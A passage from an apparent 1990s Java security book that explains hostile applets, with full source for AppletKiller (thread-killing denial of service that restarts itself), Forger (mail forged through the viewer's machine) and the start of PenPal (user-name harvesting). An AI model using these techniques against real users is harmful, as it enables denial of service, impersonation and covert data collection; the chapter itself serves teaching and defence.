+Sun Sparcstations, DEC Alphas, and Power Macintoshes, the big
+windows produced by the applet are missing the yellow warning
+banner proclaiming an &quot;Untrusted Java Applet Window.&quot;
+As you recall from Sun's Java Security FAQ, that should not be
+possible for security reasons. To illustrate the risk here, included
+on this book's CD-ROM is the applet Ungrateful.java. This applet
+attempts to pop up such an untrusted Java applet window minus
+the yellow warning banner. It reports a security threat, seeks
+a login and password in order to run the browser in a &quot;secure
+mode&quot; (whatever that might mean), and communicates any results
+back to a listening ServerSocket. In response, the applet proceeds
+with a denial-of-service attack against you. This applet was not
+meant to be convincing, and it is not very successful in practice-but
+it does serve to illustrate a definite threat that popping up
+an untrusted applet window in disguise is possible.
+<P>
+Sun has recently acknowledged that denial-of-service applets do
+pose a threat to the Web community (<TT><A HREF="http://java.sun.com/sfaq/denialOfService.html">http://java.sun.com/sfaq/denialOfService.html</A></TT>),
+and they are actively investigating ways to eliminate this threat.
+But as they say, it is not so simple to automatically tell the
+difference between an MPEG decoder and a hostile applet, and so
+the Java language and most browsers may go through many more releases
+before working solutions are available. Nevertheless, the fact
+that they are now working on these problems is very encouraging
+news.
+<H2><A NAME="SurvivaloftheFittestAppletStyle"><B><FONT SIZE=5 COLOR=#FF0000>Survival
+of the Fittest, Applet Style</FONT></B></A></H2>
+<P>
+After encountering the Hostile Applets family, you may wonder
+if there is some way to protect yourself by disabling hostile
+applets before they have a chance to attack you. The good news
+is that there is a way to shut down applets. The bad news is that
+a hostile applet has already beaten you to the punch. Listing
+23.6 displays the Grim Reaper of Java applets.
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.6. AppletKiller.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.applet.*;<BR>
+import java.awt.*;<BR>
+import java.io.*;<BR>
+<BR>
+public class AppletKiller extends java.applet.Applet implements
+Runnable {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Thread killer;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void init() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killer
+= null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void start() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(killer == null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killer
+= new Thread(this,&quot;killer&quot;);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killer.setPriority(Thread.MAX_PRIORITY);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killer.start();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void stop() {}<BR>
+<BR>
+// Kill all threads except this one<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void run() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while
+(true) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ThreadKiller.killAllThreads();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{ killer.sleep(100); }<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(InterruptedException e) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (ThreadDeath
+td) {}<BR>
+<BR>
+// Resurrect the hostile thread in case of accidental ThreadDeath
+<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;finally {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AppletKiller
+ack = new AppletKiller();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread
+reborn = new Thread(ack, &quot;killer&quot;);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reborn.start();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+}<BR>
+<BR>
+class ThreadKiller {<BR>
+<BR>
+// Ascend to the root ThreadGroup and list all subgroups recursively,
+<BR>
+// killing all threads as we go<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static void killAllThreads() {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ThreadGroup thisGroup;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ThreadGroup
+topGroup;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ThreadGroup parentGroup;
+<BR>
+<BR>
+// Determine the current thread group<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;thisGroup
+= Thread.currentThread().getThreadGroup();<BR>
+<BR>
+// Proceed to the top ThreadGroup<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;topGroup&nbsp;&nbsp;=
+thisGroup;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parentGroup
+= topGroup.getParent();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(parentGroup
+!= null) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;topGroup&nbsp;&nbsp;=
+parentGroup;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parentGroup
+= parentGroup.getParent();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+// Find all subgroups by descending recursively<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;findGroups(topGroup);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;private static void findGroups(ThreadGroup
+g) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(g == null) {return;}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int
+numThreads = g.activeCount();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int numGroups
+= g.activeGroupCount();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread[]
+threads = new Thread[numThreads];<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ThreadGroup[]
+groups = new ThreadGroup[numGroups];<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;g.enumerate(threads,
+false);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;g.enumerate(groups,
+false);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for
+(int i = 0; i &lt; numThreads; i++)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killOneThread(threads[i]);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for
+(int i = 0; i &lt; numGroups; i++)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;findGroups(groups[i]);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;private static void killOneThread(Thread
+t) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(t == null || t.getName().equals(&quot;killer&quot;)) {return;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else {t.stop();}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P>
+This nasty applet is worth examining in some detail. It begins
+by creating a thread, explicitly naming it &quot;killer&quot;
+and setting its priority to <TT>MAX_PRIORITY</TT>
+before starting it. Once again the applet's <TT>stop()</TT>
+method does nothing, but this time there is no delay-it starts
+annihilating other applets as soon as possible. The applet's <TT>run()</TT>
+method is particularly simple, but introduces one novel feature
+of the applet: the <TT>run()</TT>
+method takes the form of a <TT>try-catch-finally</TT>
+statement.
+<P>
+The <TT>try</TT> clause contains an
+infinite <TT>while</TT> loop that
+executes the <TT>killAllThreads()</TT>
+method of the class <TT>ThreadKiller</TT>
+and then sleeps for 100 milliseconds before making another pass
+through the loop. (This brief pause is needed to avoid overwhelming
+the browser and hanging it. The figure of 100 milliseconds was
+chosen empirically-it seems to get the job done, although a shorter
+time may be possible.) The <TT>catch</TT>
+clause handles the ThreadDeath error, but it does nothing and
+simply passes control to the <TT>finally</TT>
+clause.
+<P>
+The <TT>finally</TT> clause is the
+novel feature of AppletKiller. The Java language guarantees that
+this clause is executed if any portion of the <TT>try</TT>
+clause is executed. In the present context, this means that if
+the applet starts, and if ThreadDeath occurs for whatever reason,
+the applet executes its <TT>finally</TT>
+clause. A cursory inspection of this clause shows that it creates
+a new AppletKiller together with a new thread in which to run
+the resurrected applet. It also names the thread &quot;killer&quot;
+and starts it. Thus this hostile applet continues its existence
+as a ghost which will haunt your browser.
+<P>
+Run the AppletKiller long enough under adverse network conditions,
+and return to its home page. You may find that the original applet
+is reported as killed, and yet the applet killing continues unabated.
+This means that the original AppletKiller's <TT>finally</TT>
+clause has been executed, and it is the ghost of the departed
+applet which is doing the dirty work.
+<P>
+The class <TT>ThreadKiller</TT> is
+the actual applet executioner, and it has three methods. The method
+<TT>killAllThreads()</TT> starts with
+the current thread group and then ascends to the root thread group,
+which it passes to the method <TT>findGroups()</TT>.
+The method <TT>findGroups()</TT> enumerates
+all of its threads and thread groups. Then <TT>killAllThreads()</TT>
+passes each thread to <TT>killOneThread()</TT>,
+and it passes each thread group back to <TT>findGroups()</TT>.
+The method <TT>killOneThread()</TT>
+tests a thread and stops it if its name is not &quot;killer.&quot;
+<P>
+Each pass through the <TT>while</TT>
+loop of AppletKiller seeks out and stops every thread except its
+own. In other words, AppletKiller stops all applets that are running
+when it is downloaded, and it kills all applets that are encountered
+after that. It is one very nasty applet.
+<P>
+AppletKiller also can serve as a &quot;bodyguard&quot; for other
+applets. If you take an applet and name all of its threads, and
+then add the names of these threads to the if clause of the method
+<TT>ThreadKiller.killOneThread()</TT>,
+AppletKiller allows only itself and your selected applet to run.
+<P>
+As a result, it is difficult or impossible to defend against hostile
+applets by deploying an applet for this purpose-AppletKiller would
+make short shrift of such a guard applet. Defense against hostile
+applets has to come from a higher level-from the browser and the
+language.
+<P>
+Additionally, the construction in the <TT>try-catch-finally</TT>
+clause of AppletKiller's <TT>run()</TT>
+method might be used to enhance any applet and make it defend
+itself against ThreadDeath. One might be able to provide continuity
+between the original applet and its resurrected copy, initializing
+the copy with data from the original. So while AppletKiller is
+among the nastiest members of the Hostile Applets family, it does
+have some helpful insights for Java programmers.
+<H2><A NAME="PortWhereAreYou"><B><FONT SIZE=5 COLOR=#FF0000>Port
+25, Where Are You?</FONT></B></A></H2>
+<P>
+On UNIX systems it is relatively simple to &quot;forge&quot; electronic
+mail. To get started, look at the file <TT>/etc/mail/sendmail.hf</TT>
+for the commands that you need. Then use telnet to connect to
+port 25 on any machine that will accept a connection and use these
+commands to interact with sendmail. While this enables you to
+play nice little tricks on your friends, without any additional
+subterfuge you are not really forging e-mail at all, because sendmail
+is at least clever enough to discern your identity and include
+this in the header. The issue is different, however, if you use
+do this by using someone else's account without authorization,
+and that is precisely what the following applet, shown in Listing
+23.7, is designed to do.
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.7. Forger.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.applet.*;<BR>
+import java.io.*;<BR>
+import java.net.*;<BR>
+<BR>
+public class Forger extends java.applet.Applet implements Runnable
+{<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static Socket socker;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public static DataInputStream inner;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static PrintStream outer;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public static int mailPort = 25 ;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static String mailFrom = &quot;java.sun.com&quot;;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public static String toMe = &quot;venkatr@doppio.Eng.Sun.COM&quot;;//
+Change this!<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static String starter = new String();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Thread controller = null;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void init() {<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; try {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socker
+= new Socket(getDocumentBase().getHost(), mailPort);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inner =
+new DataInputStream(socker.getInputStream());<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outer
+= new PrintStream(socker.getOutputStream());<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(IOException ioe) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void start() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(controller == null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller
+= new Thread(this);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.setPriority(Thread.MAX_PRIORITY);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.start();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void stop() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(controller != null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.stop();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller
+= null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void run() {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;starter
+= inner.readLine();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(IOException ioe) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mailMe(&quot;HELO
+&quot; + mailFrom);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mailMe(&quot;MAIL
+FROM: &quot; + &quot;HostileApplets@&quot; + mailFrom);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; mailMe(&quot;RCPT TO: &quot; + toMe);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;
+mailMe(&quot;DATA&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mailMe(&quot;Subject:
+About PenPal.java&quot; + &quot;\n&quot; +&quot;Hi Venkat,&quot;&nbsp;&nbsp;+
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\n&quot;
++ &quot;\n&quot; +<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Thanks
+for taking a look at PenPal.java.&nbsp;&nbsp;From your note\n&quot;
++<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;I
+think I can understand why you're not seeing the desired\n&quot;
++<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;result.&nbsp;&nbsp;My
+guess is that perhaps you're only looking at\n&quot; +<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;an
+abbreviated header from an e-mail note that the applet\n&quot;
++<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;forges.&nbsp;&nbsp;In
+order to get the whole story, you have to\n&quot; +<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;inspect
+the full header.&nbsp;&nbsp;That's where you'll be able to\n&quot;
++<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;discern
+more information about the *sender*.&nbsp;&nbsp;Of course\n&quot;
++<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;that's
+exactly what my shell script retrieves from\n&quot; +<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;/var/mail/mladue.&nbsp;&nbsp;None
+of this is apparent from the\n&quot; +<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;source
+code, and indeed I noticed it quite by accident \n&quot; +<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;when
+I was fiddling around trying to make my mail forging\n&quot; +
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;applet
+work.&nbsp;&nbsp;Perhaps it's a peculiarity of the mail\n&quot;
++<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;system
+here in the School of Mathematics, but it really works\n&quot;+
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;for
+me here.&nbsp;&nbsp;So I hope that's what it is and that you'll\n&quot;
++<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;be
+able to reproduce my results there.\n&quot; +<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\n&quot;
++ &quot;Mark LaDue\n&quot; + &quot;mladue@math.gatech.edu\n&quot;
++ &quot;\n&quot; +<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\n&quot;
++ &quot;P.S. Of course one of my applets forged this note.\n&quot;
++<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\n.&quot;
++ &quot;\n&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mailMe(&quot;QUIT&quot;);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socker.close();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (IOException
+ioe) {}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void mailMe(String toSend) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String response
+= new String();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outer.println(toSend);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outer.flush();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response
+= inner.readLine();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch(IOException
+e) {}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P>
+The applet is very simple in its conception and operation. The
+<TT>init()</TT> method creates a socket
+to communicate with port 25 on the applet's home host, a <TT>DataInputStream</TT>
+to read lines of text to the socket, and a <TT>PrintStream</TT>
+to write lines of text to the socket. Once the applet starts,
+it uses its <TT>mailMe()</TT> method
+to interact with sendmail. <TT>mailMe()</TT>
+sends a string to <TT>sendmail</TT>
+and returns its response to the applet. The <TT>run()</TT>
+method of Forger then follows the command format given in <TT>/etc/mail/sendmail.hf</TT>
+to send its e-mail letter.
+<P>
+It is important to understand clearly what happens here. By viewing
+the applet, you are forced to connect to port 25 on the applet's
+home host, and you have no choice in the matter. You need not
+even be made aware that this is happening. The applet's author
+controls everything about your interaction with <TT>sendmail</TT>:
+the recipient, the message, and even the return address supplied
+to sendmail. Nevertheless, the e-mail header identifies you (or
+at least your machine) as the originator of the message.
+<P>
+Of course, on a soundly administered system, careful logging will
+reveal the applet's author as the instigator, so the threat may
+not be as serious as it seems at first.
+<P>
+The fact that the complete e-mail address of the person viewing
+the applet may show up in the e-mail header suggests that an applet
+can in fact obtain user names. Listing 23.8 displays such an applet.
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.8. PenPal.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.applet.*;<BR>
+import java.io.*;<BR>
+import java.net.*;<BR>
+<BR>
+public class PenPal extends java.applet.Applet implements Runnable
+{<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static Socket socker;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public static DataInputStream inner;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static PrintStream outer;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public static int mailPort = 25 ;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static String mailFrom = &quot;my.hostile.applet&quot;;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public static String toMe = &quot;mladue@math.gatech.edu&quot;;
+//Change this please!<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static String starter = new String();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Thread controller = null;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void init() {<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; try {<BR>
